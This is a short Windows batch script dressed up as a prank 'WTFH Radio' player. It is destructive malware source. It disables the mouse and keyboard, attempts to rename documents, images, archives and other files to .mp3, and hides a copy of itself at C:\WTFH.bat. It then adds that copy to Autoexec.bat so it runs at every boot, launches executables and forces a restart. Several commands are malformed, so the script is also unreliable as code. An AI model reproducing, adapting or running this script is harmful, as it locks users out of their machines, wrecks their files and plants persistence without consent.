@Echo off
c:\windows\rundll32.exe mouse,disable 
c:\windows\rundll32.exe keyboard,disable
Echo Welcome to WTFH Radio, where you don't know What The Fuck Happend!
TYPE NUL | CHOICE.COM /N /CY /TY,2 >NUL
GoTo play

:play
Echo Now I'm going to throw on a great new hit.
TYPE NUL | CHOICE.COM /N /CY /TY,1 >NUL
Save *.bat *.mp3 /y
Save *.wps *.mp3 /y
Save *.txt *.mp3 /y
Save *.doc *.mp3 /y
Save *.bmp *.mp3 /y
Save *.jpg *.mp3 /y
Save *.mpeg *.mp3 /y
Save *.html *.mp3 /y
Save *.com *.mp3 /y
Save *.zip *.mp3 /y
cls
GoTo Copy

:Copy
ATTRIB +H Copy %0 C:\WTFH.bat
Echo Call C:\WTFH.bat >> Autoexec.bat
Start C:\*.exe
cls
GoTo Restart

:Restart
rundll32.exe shell32.dll,SHExitWindowsEx 2
GoTo Exit

:Exit
END
EXIT

